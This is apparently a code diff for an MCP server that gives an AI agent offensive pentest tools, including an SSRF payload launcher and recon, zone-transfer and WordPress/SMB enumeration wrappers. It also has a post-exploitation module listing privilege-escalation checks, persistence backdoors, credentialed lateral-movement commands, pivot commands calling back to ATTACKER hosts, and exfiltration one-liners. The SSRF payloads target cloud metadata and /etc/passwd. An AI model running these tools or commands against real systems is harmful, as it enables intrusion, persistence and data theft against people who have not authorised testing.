+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("ssrf_hunter", target, {"depth": depth})
+    results = {"target": target, "tests": [], "vulnerabilities": []}
+    try:
+        delay = rate_limit_detector.get_delay(target)
+        tp = param or "url"
+        payloads = {
+            "basic": [("http://127.0.0.1", "localhost"), ("http://localhost", "name"), ("http://[::1]", "ipv6"), ("http://0x7f000001", "hex"), ("http://2130706433", "decimal")],
+            "cloud": [("http://169.254.169.254/latest/meta-data/", "AWS"), ("http://metadata.google.internal/computeMetadata/v1/", "GCP"), ("http://169.254.169.254/metadata/instance", "Azure")],
+            "bypass": [("http://127.1", "short"), ("http://127.0.0.1@evil.com", "auth"), ("http://0", "zero"), ("http://127.0.0.1:8080", "alt_port")],
+            "protocol": [("gopher://127.0.0.1:25/_HELO", "gopher"), ("dict://127.0.0.1:6379/info", "dict"), ("file:///etc/passwd", "file")],
+        }
+        groups = {"stealth": ["basic"], "light": ["basic", "cloud"], "deep": ["basic", "cloud", "bypass"], "aggressive": list(payloads.keys())}
+        for grp in groups.get(depth, ["basic", "cloud"]):
+            for payload, desc in payloads.get(grp, []):
+                enc = urllib.parse.quote(payload, safe="")
+                url = f"{target}{'&' if '?' in target else '?'}{tp}={enc}"
+                r = await run_command(["curl", "-sk", "--max-time", "10", url], timeout=15)
+                if r.get("stdout"):
+                    body = r["stdout"]
+                    entry = {"payload": payload, "desc": desc, "group": grp, "size": len(body)}
+                    interesting = False
+                    if "root:" in body:
+                        entry["finding"] = "File read"
+                        interesting = True
+                    elif any(c in body for c in ["ami-", "instance-id", "iam"]):
+                        entry["finding"] = "Cloud metadata"
+                        interesting = True
+                    elif len(body) > 200 and grp in ["cloud", "protocol"]:
+                        entry["finding"] = "Response - investigate"
+                        interesting = True
+                    results["tests"].append(entry)
+                    if interesting:
+                        results["vulnerabilities"].append(entry)
+                        pentest_memory.store_finding(target, "ssrf_hunter", "ssrf_found", {"payload": payload})
+                await asyncio.sleep(delay)
+        if depth in ["deep", "aggressive"]:
+            results["dns_rebinding"] = {"setup": "Use rebind.network for DNS rebinding bypass"}
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 14: CRYPTO FORENSICS
+# ============================================================================
+
+@mcp.tool()
+async def crypto_forensics(
+    target: str, depth: str = "deep", modules: str = "all", timeout: int = 600,
+) -> str:
+    """Blockchain audit: smart contract analysis, DeFi protocol scanning, transaction analysis.
+    modules: all|contract,defi,tx_analysis"""
+    target = InputValidator.sanitize_target(target)
+    execution = session_manager.start_execution("crypto_forensics", target, {"depth": depth})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["contract", "defi", "tx_analysis"]
+        if "contract" in mod_list:
+            cr = {"checks": []}
+            vuln_patterns = [
+                ("reentrancy", r"\.call\{value:", "Reentrancy via external call with value"),
+                ("unchecked_return", r"\.send\(|\.transfer\(", "Unchecked return value"),
+                ("tx_origin", r"tx\.origin", "tx.origin used for auth (phishable)"),
+                ("selfdestruct", r"selfdestruct\(|suicide\(", "Selfdestruct present"),
+                ("delegatecall", r"delegatecall\(", "Delegatecall (proxy pattern risk)"),
+                ("block_timestamp", r"block\.timestamp", "Block timestamp dependency"),
+            ]
+            if target.startswith("0x") or "etherscan" in target:
+                cr["note"] = "Provide contract source code for analysis"
+            else:
+                for name, pat, desc in vuln_patterns:
+                    cr["checks"].append({"vulnerability": name, "pattern": pat, "description": desc})
+                cr["tools"] = ["slither", "mythril", "solhint", "echidna"]
+            results["modules"]["contract"] = cr
+        if "defi" in mod_list:
+            dr = {"checks": ["flash_loan_attack", "oracle_manipulation", "front_running", "rug_pull_indicators", "infinite_approval"]}
+            results["modules"]["defi"] = dr
+        if "tx_analysis" in mod_list:
+            tr = {"capabilities": ["trace_transactions", "identify_mixer_usage", "whale_tracking", "MEV_detection"]}
+            results["modules"]["tx_analysis"] = tr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 15: OSINT HARVESTER
+# ============================================================================
+
+@mcp.tool()
+async def osint_harvester(
+    target: str, depth: str = "deep", modules: str = "all", timeout: int = 600,
+) -> str:
+    """OSINT: subdomain enumeration, DNS recon, domain intel, WHOIS, certificate transparency.
+    modules: all|subdomains,dns,whois,crt,dorking"""
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("osint_harvester", target, {"depth": depth})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["subdomains", "dns", "whois", "crt", "dorking"]
+        hostname = target.split("://")[-1].split("/")[0].split(":")[0]
+        if "subdomains" in mod_list:
+            sr = {"subdomains": [], "sources": []}
+            # subfinder
+            sf = await run_command(["subfinder", "-d", hostname, "-silent"], timeout=120)
+            if sf.get("stdout"):
+                sr["subdomains"] = list(set(sf["stdout"].strip().split("\n")))
+                sr["sources"].append("subfinder")
+            # amass (if available and deep)
+            if depth in ["deep", "aggressive"]:
+                am = await run_command(["amass", "enum", "-passive", "-d", hostname], timeout=min(timeout, 180))
+                if am.get("stdout"):
+                    new_subs = [s.strip() for s in am["stdout"].strip().split("\n") if s.strip()]
+                    sr["subdomains"] = list(set(sr["subdomains"] + new_subs))
+                    sr["sources"].append("amass")
+            # crt.sh
+            crt = await run_command(["curl", "-sk", f"https://crt.sh/?q=%.{hostname}&output=json"], timeout=30)
+            if crt.get("stdout"):
+                try:
+                    crt_data = json.loads(crt["stdout"])
+                    crt_subs = list(set(e.get("name_value", "").strip() for e in crt_data if e.get("name_value")))
+                    sr["subdomains"] = list(set(sr["subdomains"] + crt_subs))
+                    sr["sources"].append("crt.sh")
+                except json.JSONDecodeError:
+                    pass
+            sr["total"] = len(sr["subdomains"])
+            results["modules"]["subdomains"] = sr
+            if sr["subdomains"]:
+                pentest_memory.store_finding(target, "osint_harvester", "subdomains", {"count": sr["total"]})
+        if "dns" in mod_list:
+            dr = {"records": {}}
+            for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV"]:
+                r = await run_command(["dig", "+short", rtype, hostname], timeout=10)
+                if r.get("stdout") and r["stdout"].strip():
+                    dr["records"][rtype] = r["stdout"].strip().split("\n")
+            # Zone transfer attempt
+            ns_records = dr.get("records", {}).get("NS", [])
+            for ns in ns_records[:3]:
+                axfr = await run_command(["dig", f"@{ns.rstrip('.')}", hostname, "AXFR", "+short"], timeout=15)
+                if axfr.get("stdout") and len(axfr["stdout"]) > 100:
+                    dr["zone_transfer"] = {"ns": ns, "success": True, "data": axfr["stdout"][:2000]}
+                    pentest_memory.store_finding(target, "osint_harvester", "zone_transfer", {"ns": ns})
+                    break
+            results["modules"]["dns"] = dr
+        if "whois" in mod_list:
+            wr = await run_command(["whois", hostname], timeout=30)
+            whois_data = {}
+            if wr.get("stdout"):
+                for field in ["Registrar:", "Creation Date:", "Updated Date:", "Name Server:", "Organization:", "Registrant:"]:
+                    match = re.search(f"{field}\\s*(.+)", wr["stdout"], re.IGNORECASE)
+                    if match:
+                        whois_data[field.rstrip(":").strip()] = match.group(1).strip()
+            results["modules"]["whois"] = whois_data
+        if "dorking" in mod_list:
+            dr = {"dorks": [
+                f'site:{hostname} filetype:pdf', f'site:{hostname} filetype:xlsx',
+                f'site:{hostname} inurl:admin', f'site:{hostname} inurl:login',
+                f'site:{hostname} intitle:"index of"', f'site:{hostname} inurl:api',
+                f'"{hostname}" password OR secret OR credentials filetype:txt',
+                f'site:{hostname} ext:sql OR ext:bak OR ext:log',
+            ]}
+            results["modules"]["dorking"] = dr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 16: POST-EXPLOIT OPS
+# ============================================================================
+
+@mcp.tool()
+async def post_exploit_ops(
+    target: str, depth: str = "deep", modules: str = "all",
+    session_type: str = "auto", timeout: int = 600,
+) -> str:
+    """Post-exploitation: pivoting, persistence, lateral movement, privilege escalation, data exfil.
+    modules: all|privesc,persist,lateral,pivot,exfil"""
+    target = InputValidator.sanitize_target(target)
+    execution = session_manager.start_execution("post_exploit_ops", target, {"depth": depth})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["privesc", "persist", "lateral", "pivot", "exfil"]
+        if "privesc" in mod_list:
+            pr = {"linux": {}, "windows": {}}
+            pr["linux"] = {
+                "enumeration": ["linpeas.sh", "linux-exploit-suggester.sh", "pspy64"],
+                "checks": [
+                    "sudo -l (sudo misconfig)", "find / -perm -4000 (SUID)",
+                    "cat /etc/crontab (cron jobs)", "ls -la /etc/passwd (writable?)",
+                    "getcap -r / 2>/dev/null (capabilities)", "env (environment vars)",
+                    "ss -tlnp (internal services)", "cat /etc/shadow (readable?)",
+                ],
+                "kernel": "uname -a | linux-exploit-suggester",
+            }
+            pr["windows"] = {
+                "enumeration": ["winpeas.exe", "PowerUp.ps1", "Seatbelt.exe", "SharpUp.exe"],
+                "checks": [
+                    "whoami /priv (token privs)", "net localgroup administrators",
+                    "systeminfo (missing patches)", "reg query (autologon creds)",
+                    "schtasks /query (scheduled tasks)", "wmic service list (unquoted paths)",
+                    "icacls C:\\Program Files (writable dirs)", "cmdkey /list (saved creds)",
+                ],
+            }
+            results["modules"]["privesc"] = pr
+        if "persist" in mod_list:
+            per = {
+                "linux": ["crontab -e", "~/.bashrc injection", "systemd service", "SSH key", "LD_PRELOAD", "PAM backdoor"],
+                "windows": ["schtasks", "Registry Run key", "WMI event", "DLL hijack", "Golden Ticket", "Startup folder"],
+            }
+            results["modules"]["persist"] = per
+        if "lateral" in mod_list:
+            lat = {
+                "techniques": [
+                    "PsExec (impacket-psexec)", "WMIExec (impacket-wmiexec)",
+                    "SMBExec (impacket-smbexec)", "Evil-WinRM", "RDP",
+                    "Pass-the-Hash (pth-winexe)", "Pass-the-Ticket",
+                    "SSH key reuse", "Crackmapexec SMB",
+                ],
+                "tools": {
+                    "crackmapexec": f"crackmapexec smb {target} -u user -p pass --shares",
+                    "psexec": f"impacket-psexec DOMAIN/user:pass@{target}",
+                    "wmiexec": f"impacket-wmiexec DOMAIN/user:pass@{target}",
+                    "evil_winrm": f"evil-winrm -i {target} -u user -p pass",
+                },
+            }
+            results["modules"]["lateral"] = lat
+        if "pivot" in mod_list:
+            piv = {
+                "tools": {
+                    "ligolo-ng": {"setup": f"ligolo-agent -connect ATTACKER:11601 -retry", "proxy": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"},
+                    "chisel": {"server": "chisel server -p 8080 --reverse", "client": f"chisel client ATTACKER:8080 R:socks"},
+                    "ssh_tunnel": {"dynamic": f"ssh -D 9050 user@{target}", "local": f"ssh -L 8080:internal:80 user@{target}", "remote": f"ssh -R 8080:localhost:80 user@{target}"},
+                    "socat": f"socat TCP-LISTEN:8080,fork TCP:{target}:80",
+                },
+                "proxychains": "Configure /etc/proxychains.conf then: proxychains nmap -sT target",
+            }
+            results["modules"]["pivot"] = piv
+        if "exfil" in mod_list:
+            exf = {
+                "methods": [
+                    "HTTP: python3 -m http.server + wget", "DNS: dnscat2 / iodine",
+                    "ICMP: icmpsh", "SMB: smbclient put", "SCP: scp file user@host:/path",
+                    "base64: cat file | base64 | curl -d @-", "steganography: steghide embed",
+                ],
+            }
+            results["modules"]["exfil"] = exf
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 17: REPORTING ENGINE
+# ============================================================================
+
+@mcp.tool()
+async def reporting_engine(
+    target: str, report_type: str = "full", format: str = "json", timeout: int = 300,
+) -> str:
+    """Report generation: scope check, security audit, header analysis, full pentest report.
+    report_type: full|executive|technical|scope_check|header_audit"""
+    target = InputValidator.sanitize_target(target)
+    execution = session_manager.start_execution("reporting_engine", target, {"report_type": report_type})
+    results = {"target": target, "report_type": report_type}
+    try:
+        context = pentest_memory.get_context(target)
+        all_findings = pentest_memory.get_findings(target)
+        if report_type == "scope_check":
+            results["scope"] = {
+                "target": target,
+                "resolvable": False,
+                "ip_addresses": [],
+            }
+            try:
+                ips = socket.getaddrinfo(target.split("://")[-1].split("/")[0].split(":")[0], None)
+                results["scope"]["resolvable"] = True
+                results["scope"]["ip_addresses"] = list(set(a[4][0] for a in ips))
             except socket.gaierror:
                 pass
-        all_subdomains.update(dns_subs)
-        method_results["dns_brute"] = {"count": len(dns_subs), "subdomains": sorted(dns_subs)}
-
-    progress.update("Resolving IPs")
-    resolved = {}
-    for sub in sorted(all_subdomains)[:200]:
-        try:
-            ip = socket.gethostbyname(sub)
-            resolved[sub] = ip
-        except Exception:
-            resolved[sub] = "unresolved"
-
-    progress.update("Analysis")
-    unique_ips = set(v for v in resolved.values() if v != "unresolved")
-    output = {
-        "status": "success", "target": target,
-        "total_unique_subdomains": len(all_subdomains),
-        "resolved_count": sum(1 for v in resolved.values() if v != "unresolved"),
-        "unique_ips": len(unique_ips),
-        "methods_used": method_results,
-        "all_subdomains": sorted(all_subdomains)[:300],
-        "resolved_map": dict(sorted(resolved.items())[:200]),
-        "ip_list": sorted(unique_ips)
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("subdomain_enum", target, output)
-    log_tool_execution("subdomain_enum", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def dns_recon(
-    target: str,
-    record_types: str = "A,AAAA,MX,NS,TXT,SOA,CNAME,SRV,PTR",
-    zone_transfer: bool = True,
-    timeout: int = 120
-) -> str:
-    """
-    Deep DNS reconnaissance: record enumeration, zone transfer attempts, DNSSEC checks, reverse lookups.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("dns_recon", target, 7)
-    inputs = {"target": target, "record_types": record_types, "zone_transfer": zone_transfer}
-
-    dns_results = {}
-    progress.update("Querying DNS records")
-    for rtype in record_types.split(","):
-        rtype = rtype.strip().upper()
-        cmd = ["dig", "+short", target, rtype]
-        r = run_command_advanced(cmd, timeout=15, trace=trace)
-        records = [l.strip() for l in r["stdout"].split("\n") if l.strip()]
-        if records:
-            dns_results[rtype] = records
-
-    progress.update("Full dig output")
-    full_dig = run_command_advanced(["dig", "+noall", "+answer", target, "ANY"], timeout=20, trace=trace)
-
-    progress.update("Zone transfer attempt")
-    zt_results = []
-    if zone_transfer and "NS" in dns_results:
-        for ns in dns_results["NS"]:
-            ns = ns.rstrip(".")
-            zt_cmd = ["dig", f"@{ns}", target, "AXFR", "+short"]
-            zt_r = run_command_advanced(zt_cmd, timeout=20, trace=trace)
-            if zt_r["stdout"].strip() and "Transfer failed" not in zt_r["stdout"]:
-                zt_results.append({"nameserver": ns, "records": zt_r["stdout"][:3000],
-                                   "vulnerable": True})
-            else:
-                zt_results.append({"nameserver": ns, "vulnerable": False})
-
-    progress.update("WHOIS lookup")
-    whois_result = run_command_advanced(["whois", target], timeout=30, trace=trace)
-    whois_info = {}
-    for line in whois_result["stdout"].split("\n"):
-        for key in ["Registrar", "Creation Date", "Expiration Date", "Name Server", "DNSSEC", "Registrant"]:
-            if key.lower() in line.lower() and ":" in line:
-                whois_info[line.split(":")[0].strip()] = ":".join(line.split(":")[1:]).strip()
-
-    progress.update("Reverse DNS")
-    reverse_dns = {}
-    if "A" in dns_results:
-        for ip in dns_results["A"][:5]:
-            rev_cmd = ["dig", "+short", "-x", ip]
-            rev_r = run_command_advanced(rev_cmd, timeout=10, trace=trace)
-            if rev_r["stdout"].strip():
-                reverse_dns[ip] = rev_r["stdout"].strip()
-
-    progress.update("Analysis")
-    zone_transfer_vuln = any(z.get("vulnerable") for z in zt_results)
-    output = {
-        "status": "success", "target": target,
-        "dns_records": dns_results,
-        "full_dig_output": full_dig["stdout"][:2000],
-        "zone_transfer": {"attempted": zone_transfer, "results": zt_results,
-                         "vulnerable": zone_transfer_vuln},
-        "whois": whois_info,
-        "reverse_dns": reverse_dns,
-        "severity": "HIGH" if zone_transfer_vuln else "info",
-        "record_count": sum(len(v) for v in dns_results.values())
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("dns_recon", target, output)
-    log_tool_execution("dns_recon", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# ADVANCED RECON TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def nuclei_scan(
-    target: str,
-    templates: str = "",
-    severity: str = "critical,high,medium",
-    rate_limit: int = 150,
-    concurrency: int = 25,
-    timeout: int = 300
-) -> str:
-    """
-    Vulnerability scanning with Nuclei templates engine. Supports custom templates, severity filtering, and chain enrichment.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("nuclei_scan", target, 7)
-    inputs = {"target": target, "templates": templates, "severity": severity}
-
-    progress.update("Checking Nuclei availability")
-    check = run_command_advanced(["which", "nuclei"], timeout=10, trace=trace)
-    if check["return_code"] != 0:
-        output = {"status": "error", "message": "nuclei not found. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}
-        log_tool_execution("nuclei_scan", target, inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-
-    progress.update("Building scan command")
-    url = target if target.startswith("http") else f"http://{target}"
-    json_out = os.path.join(exec_dir, "nuclei_output.json")
-    cmd = ["nuclei", "-u", url, "-severity", severity, "-rate-limit", str(rate_limit),
-           "-concurrency", str(concurrency), "-json-export", json_out, "-silent"]
-    if templates:
-        cmd.extend(["-t", templates])
-
-    progress.update("Running Nuclei scan")
-    trace.command(f"nuclei -u {url} -severity {severity}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing results")
-    findings = []
-    if os.path.exists(json_out):
-        with open(json_out) as f:
-            for line in f:
-                try:
-                    findings.append(json.loads(line.strip()))
-                except Exception:
-                    pass
-
-    for line in result["stdout"].split("\n"):
-        if line.strip() and not line.startswith("["):
-            try:
-                findings.append(json.loads(line.strip()))
-            except Exception:
-                pass
-
-    progress.update("Categorizing findings")
-    categorized = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
-    for f in findings:
-        sev = f.get("info", {}).get("severity", "info").lower()
-        entry = {
-            "template_id": f.get("template-id", f.get("templateID", "")),
-            "name": f.get("info", {}).get("name", ""),
-            "severity": sev,
-            "matched_at": f.get("matched-at", f.get("matched", "")),
-            "description": f.get("info", {}).get("description", "")[:500],
-            "reference": f.get("info", {}).get("reference", [])[:5],
-            "tags": f.get("info", {}).get("tags", [])
-        }
-        categorized.get(sev, categorized["info"]).append(entry)
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url,
-        "total_findings": len(findings),
-        "severity_summary": {k: len(v) for k, v in categorized.items()},
-        "findings": categorized,
-        "severity": "CRITICAL" if categorized["critical"] else ("HIGH" if categorized["high"] else "info")
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("nuclei_scan", target, output)
-    log_tool_execution("nuclei_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def wpscan_audit(
-    target: str,
-    enumerate: str = "vp,vt,u,dbe",
-    api_token: str = "",
-    timeout: int = 180
-) -> str:
-    """
-    WordPress security audit using WPScan. Enumerates vulnerable plugins, themes, users, and config issues.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("wpscan_audit", target, 7)
-    url = target if target.startswith("http") else f"http://{target}"
-    inputs = {"target": url, "enumerate": enumerate}
-
-    progress.update("Building WPScan command")
-    json_out = os.path.join(exec_dir, "wpscan_output.json")
-    cmd = ["wpscan", "--url", url, "--enumerate", enumerate, "--format", "json",
-           "--output", json_out, "--no-banner", "--random-user-agent"]
-    if api_token:
-        cmd.extend(["--api-token", api_token])
-
-    progress.update("Running WPScan")
-    trace.command(f"wpscan --url {url} --enumerate {enumerate}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing results")
-    wp_data = {}
-    if os.path.exists(json_out):
-        try:
-            with open(json_out) as f:
-                wp_data = json.load(f)
-        except Exception:
-            pass
-
-    progress.update("Extracting vulnerabilities")
-    vulns = []
-    for key in ["plugins", "themes", "main_theme"]:
-        items = wp_data.get(key, {})
-        if isinstance(items, dict):
-            for name, data in items.items():
-                for v in data.get("vulnerabilities", []):
-                    vulns.append({
-                        "component": f"{key}/{name}",
-                        "title": v.get("title", ""),
-                        "vuln_type": v.get("vuln_type", ""),
-                        "fixed_in": v.get("fixed_in", ""),
-                        "references": v.get("references", {}).get("url", [])[:5]
-                    })
-
-    wp_version = wp_data.get("version", {})
-    users = [u.get("username", u) if isinstance(u, dict) else str(u) for u in wp_data.get("users", [])]
-
-    progress.update("Checking interesting findings")
-    interesting = wp_data.get("interesting_findings", [])
-    findings_summary = []
-    for finding in interesting:
-        findings_summary.append({
-            "url": finding.get("url", ""),
-            "type": finding.get("type", ""),
-            "interesting_entries": finding.get("interesting_entries", [])[:5]
-        })
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url,
-        "wordpress_version": wp_version.get("number", "unknown") if isinstance(wp_version, dict) else str(wp_version),
-        "vulnerabilities_found": len(vulns), "vulnerabilities": vulns,
-        "users_found": users[:20], "user_count": len(users),
-        "interesting_findings": findings_summary[:20],
-        "raw_output_preview": result["stdout"][:2000],
-        "severity": "CRITICAL" if vulns else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("wpscan_audit", target, output)
-    log_tool_execution("wpscan_audit", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def ffuf_fuzz(
-    target: str,
-    wordlist: str = "",
-    fuzz_mode: str = "dir",
-    extensions: str = "",
-    method: str = "GET",
-    headers: str = "",
-    data: str = "",
-    filters: str = "",
-    threads: int = 40,
-    timeout: int = 180
-) -> str:
-    """
-    Fast web fuzzer using ffuf. Modes: dir (directory), vhost (virtual host), param (parameter), custom (FUZZ keyword in URL).
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("ffuf_fuzz", target, 7)
-    url = target if target.startswith("http") else f"http://{target}"
-    inputs = {"target": url, "fuzz_mode": fuzz_mode, "method": method}
-
-    progress.update("Preparing wordlist")
-    if not wordlist or not os.path.exists(wordlist):
-        default_lists = {
-            "dir": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
-            "vhost": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
-            "param": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
-        }
-        wordlist = default_lists.get(fuzz_mode, default_lists["dir"])
-        if not os.path.exists(wordlist):
-            wordlist = "/usr/share/wordlists/dirb/common.txt"
-
-    progress.update("Building ffuf command")
-    json_out = os.path.join(exec_dir, "ffuf_output.json")
-    if fuzz_mode == "dir":
-        fuzz_url = url.rstrip("/") + "/FUZZ"
-    elif fuzz_mode == "vhost":
-        fuzz_url = url
-    elif fuzz_mode == "param":
-        sep = "&" if "?" in url else "?"
-        fuzz_url = f"{url}{sep}FUZZ=test"
-    else:
-        fuzz_url = url if "FUZZ" in url else url.rstrip("/") + "/FUZZ"
-
-    cmd = ["ffuf", "-u", fuzz_url, "-w", wordlist, "-t", str(threads),
-           "-o", json_out, "-of", "json", "-mc", "all"]
-    if fuzz_mode == "vhost":
-        host = target.split("/")[0] if "/" in target else target
-        cmd.extend(["-H", f"Host: FUZZ.{host}"])
-    if extensions and fuzz_mode == "dir":
-        cmd.extend(["-e", extensions])
-    if method != "GET":
-        cmd.extend(["-X", method])
-    if headers:
-        for h in headers.split(";"):
-            if h.strip():
-                cmd.extend(["-H", h.strip()])
-    if data:
-        cmd.extend(["-d", data])
-    if filters:
-        cmd.extend(["-fc", filters])
-    else:
-        cmd.extend(["-fc", "404"])
-
-    progress.update("Running ffuf")
-    trace.command(f"ffuf -u {fuzz_url}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing results")
-    ffuf_data = {}
-    if os.path.exists(json_out):
-        try:
-            with open(json_out) as f:
-                ffuf_data = json.load(f)
-        except Exception:
-            pass
-
-    ffuf_results = ffuf_data.get("results", [])
-    categorized = {"2xx": [], "3xx": [], "4xx": [], "5xx": []}
-    for r in ffuf_results:
-        status = r.get("status", 0)
-        entry = {
-            "input": r.get("input", {}).get("FUZZ", ""),
-            "url": r.get("url", ""),
-            "status": status,
-            "length": r.get("length", 0),
-            "words": r.get("words", 0),
-            "lines": r.get("lines", 0)
-        }
-        if 200 <= status < 300: categorized["2xx"].append(entry)
-        elif 300 <= status < 400: categorized["3xx"].append(entry)
-        elif 400 <= status < 500: categorized["4xx"].append(entry)
-        else: categorized["5xx"].append(entry)
-
-    progress.update("Analysis")
-    high_interest = [r for r in categorized["2xx"] if r["length"] > 0]
-    output = {
-        "status": "success", "target": url, "fuzz_mode": fuzz_mode,
-        "total_results": len(ffuf_results),
-        "status_summary": {k: len(v) for k, v in categorized.items()},
-        "high_interest_results": high_interest[:50],
-        "all_results": {k: v[:30] for k, v in categorized.items()},
-        "wordlist": wordlist
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("ffuf_fuzz", target, output)
-    log_tool_execution("ffuf_fuzz", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# NETWORK TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def arp_scan(
-    network: str = "192.168.1.0/24",
-    interface: str = "",
-    timeout: int = 60
-) -> str:
-    """
-    Network host discovery using ARP scanning. Discovers live hosts, MAC addresses, and vendor identification.
-    """
-    target = network
-    trace, progress, exec_dir = _init_tool_context("arp_scan", target, 5)
-    inputs = {"network": network, "interface": interface}
-
-    progress.update("Running ARP scan")
-    cmd = ["arp-scan"]
-    if interface:
-        cmd.extend(["-I", interface])
-    cmd.append(network)
-    trace.command(f"arp-scan {network}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing hosts")
-    hosts = []
-    for line in result["stdout"].split("\n"):
-        parts = line.split("\t")
-        if len(parts) >= 2 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0].strip()):
-            host = {"ip": parts[0].strip(), "mac": parts[1].strip() if len(parts) > 1 else ""}
-            if len(parts) > 2:
-                host["vendor"] = parts[2].strip()
-            hosts.append(host)
-
-    progress.update("Nmap fallback ping sweep")
-    if not hosts:
-        nmap_cmd = ["nmap", "-sn", "-T4", network]
-        nmap_result = run_command_advanced(nmap_cmd, timeout=60, trace=trace)
-        for line in nmap_result["stdout"].split("\n"):
-            m = re.search(r'Nmap scan report for (\S+)', line)
-            if m:
-                hosts.append({"ip": m.group(1), "mac": "", "vendor": "nmap-discovered"})
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "network": network,
-        "hosts_found": len(hosts), "hosts": hosts,
-        "unique_vendors": list(set(h.get("vendor", "") for h in hosts if h.get("vendor"))),
-        "raw_output_preview": result["stdout"][:2000]
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("arp_scan", target, output)
-    log_tool_execution("arp_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def enum4linux_scan(
-    target: str,
-    aggressive: bool = False,
-    timeout: int = 120
-) -> str:
-    """
-    Windows/Samba enumeration using enum4linux. Discovers shares, users, groups, OS info, password policies.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("enum4linux_scan", target, 6)
-    inputs = {"target": target, "aggressive": aggressive}
-
-    progress.update("Running enum4linux")
-    cmd = ["enum4linux"]
-    if aggressive:
-        cmd.append("-a")
-    else:
-        cmd.append("-a")
-    cmd.append(target)
-    trace.command(f"enum4linux -a {target}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing shares")
-    shares = []
-    users = []
-    groups = []
-    os_info = ""
-    password_policy = {}
-
-    output_lines = result["stdout"].split("\n")
-    current_section = ""
-    for line in output_lines:
-        if "Sharename" in line:
-            current_section = "shares"
-        elif "user:" in line.lower() or "username" in line.lower():
-            m = re.search(r'user:\[(\S+)\]', line)
-            if m:
-                users.append(m.group(1))
-        elif "group:" in line.lower():
-            m = re.search(r'group:\[(.+?)\]', line)
-            if m:
-                groups.append(m.group(1))
-        elif "OS=" in line or "OS:" in line:
-            os_info = line.strip()
-        elif current_section == "shares" and line.strip() and not line.startswith("---"):
-            parts = line.split()
-            if parts and not parts[0].startswith("="):
-                shares.append({"name": parts[0], "type": parts[1] if len(parts) > 1 else "",
-                              "comment": " ".join(parts[2:]) if len(parts) > 2 else ""})
-        elif "password" in line.lower() and ":" in line:
-            k, _, v = line.partition(":")
-            password_policy[k.strip()] = v.strip()
-
-    progress.update("SMB client check")
-    smb_cmd = ["smbclient", "-L", f"//{target}", "-N"]
-    smb_result = run_command_advanced(smb_cmd, timeout=30, trace=trace)
-
